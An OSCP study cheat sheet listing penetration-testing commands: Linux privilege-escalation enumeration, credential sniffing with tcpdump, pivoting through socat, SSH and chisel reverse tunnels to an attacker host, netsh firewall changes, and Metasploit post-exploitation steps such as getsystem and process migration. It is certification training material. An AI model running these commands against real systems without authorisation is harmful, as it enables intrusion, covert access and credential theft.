# OSCP
OSCP Cheat sheet

## Linux Privilege Escalation
### Manual Enumeration
#### User and group
```
id
```
#### Enumerates all users
```
cat /etc/passwd
```
#### Host name discovery
```
hostname
```
#### OS release and version
```
cat /etc/issue    
cat /etc/*-release
uname -a
```
#### Running processes
> **a** and **x** for all processes without tty, **u** for user readable
```
ps aux    
```
#### TCP/IP configuration + Routing
> **a** = all, **n** = avoid hostname resolution, **p** = process name
```
ip a
ifconfig
route
routel
netstat
ss -anp
```
#### Firewall rules
```
cat /etc/iptables/rules.v4
```
#### Scheduled tasks
```
ls -lah /etc/cron*
(sudo) crontab -l
```
#### Installed applications
> **dpkg** is for Debian systems. For Red Hat-based systems, use **rpm**
```
dpkg -l
```
#### Sensitive files
```
find / -writable -type d 2>/dev/null
```
#### Mounted filesystems and drives
```
cat /etc/fstab         \\\\ List of drives that will be mounted at boot
mount                  \\\\ List of all mounted filesystems
lsblk                  \\\\ List of all disks
```
#### Kernel modules
```
lsmod
/sbin/modinfo <name of module we want informations of "example: libata">
```
#### SUID programms
```
find / -perm -u=s -type f 2>/dev/null
```
### Automated Enumeration
>  This program has to be run on the victim's machine (There are plenty other programms that exists such as LinPEAS...)
```
./unix-privesc-check <mode> > output.txt
```
### Exposed Confidential Informations
#### User trails
> **6** and **6** are for minimum and maximum, **-t** is for pattern
```
env                               \\\\ Environment variables
cat .bashrc
crunch 6 6 -t Lab%%% > wordlist   \\\\ Creating a wordlist for bruteforce
```
#### Service Footprints
> run "command" every **-n** seconds
```
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"  \\\\ -A (ASCI) -i (interface "lo")
```
### Insecure File Permission
```
grep "CRON" /var/log/syslog
```
### Insecure System Components
> **-C** filters the output based on name. **-r** means recursive
> Some of the Components might be protected by AppArmor...
```
ps u -C passwd
/usr/sbin/getcap -r / 2>/dev/null        \\\\ Manual enumeration of binaries with capabilities
sudo -l                                  \\\\ Lists available "sudo" commands of the current user
cat /var/log/syslog                      \\\\ Can help understanding why a command didn't work as expected
```
#### Exploit Kernel Vulnerabilities
```
cat /etc/issue        \\\\ General informations about the system
uname -r
arch                  \\\\ Gives architecture information
```

## Port Redirection and SSH Tunneling
### Port Forwarding with Linux tools
> **-ddd** = verbose, **fork** doesn't kill the connection after request, **-U** = User.
```
ip addr
ip route
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.216.215:5432
psql -h 192.168.50.63 -p 2345 -U postgres
```
### SSH Tunneling
> **-D** is for Dynamic, that's why only argument is put into the command, because we wait for every connection (not a precise one)
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
ss -ntplu
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
cat /etc/proxychains4.conf                                                          \\\\ This is the config file for "proxychain"
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234        \\\\ Same request as the last section, but with proxychain (for Dynamic tunneling)
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217                          \\\\ Nmap request with "proxychain"
```
### SSH Remote Port Forwarding
> **netsh** is a tool that manages Firewalls (It might need some administrator privileges to be ran.)
```
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4                        \\\\ "Bind shell" like port forwarding
psql -h 127.0.0.1 -p 2345 -U postgres
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
netsh interface portproxy show all
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```
### Tunneling Through Deep Packet Inspection
```
tail -f /var/log/apache2/access.log                                          \\\\ Verifying the logs of Apache2 server
chisel server --port 8080 --reverse                                          \\\\ To run on the kali machine (server)
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &             \\\\ To run on the victim's machine (client)
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```
### DNS Tunneling
```
sudo tcpdump -i ens192 udp port 53
```
## The Metasploit Framework
> Commands starting with **l** while in meterpreter shell, are executed on the local machine (i.e kali machine)
```
sudo msfdb init
sudo systemctl enable postgresql
sudo msfconsole
workspace                               \\\\ Displays the workspaces
workspace -a <name>                     \\\\ Creates a new workspace
db_nmap                                 \\\\ Nmap scan but the results are recorded into the database and can be interacted with next commands
hosts
services (-p for specific port)
show -h
show auxiliary
search type:auxiliary smb
info                                    \\\\ Displays informations about the module
services -p 445 --rhosts                \\\\ This is to be used while setting rhosts with the database (nmap results for example)
sessions -l
sessions -i <id>
sessions -k <id>
lpwd                                   
lcd 
```
### Post Exploitation with Metasploit
>**-H** is for hidden (so the windows doesn't show up on the target's machine)
```
getuid
getsystem                              \\\\ This is used to escalate priv
ps                                     \\\\ Shows all running processes
migrate <process id>                   \\\\ Migrates the current process to the desired process id
execute -H -f notepad.exe
```
